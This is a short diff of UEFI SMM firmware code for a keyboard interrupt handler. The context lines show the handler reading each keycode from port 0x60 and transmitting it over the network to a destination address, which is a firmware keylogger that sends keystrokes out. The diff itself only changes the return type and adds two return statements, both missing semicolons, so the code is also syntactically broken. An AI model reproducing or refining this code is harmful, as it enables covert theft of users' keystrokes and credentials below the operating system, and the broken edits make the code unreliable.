@@ -12,7 +12,7 @@ EFI_SMM_BASE2_PROTOCOL *SmmBase2;
 EFI_SMM_SYSTEM_TABLE2 *Smst;
 EFI_SIMPLE_NETWORK_PROTOCOL *Snp;
 
-VOID EFIAPI KeyboardSmiHandler (
+EFI_STATUS EFIAPI KeyboardSmiHandler (
     IN EFI_HANDLE DispatchHandle,
     IN CONST VOID *Context OPTIONAL,
     IN OUT VOID *CommBuffer OPTIONAL,
@@ -32,7 +32,10 @@ VOID EFIAPI KeyboardSmiHandler (
     if (status & 0x01) {
         UINT8 keycode = IoRead8(0x60); // Keyboard data port
         Snp->Transmit(Snp, 0, sizeof(keycode), &keycode, &DestIp, NULL, 0);
+        return EFI_SUCCESS
     }
+
+    return status
 }
 
 EFI_STATUS
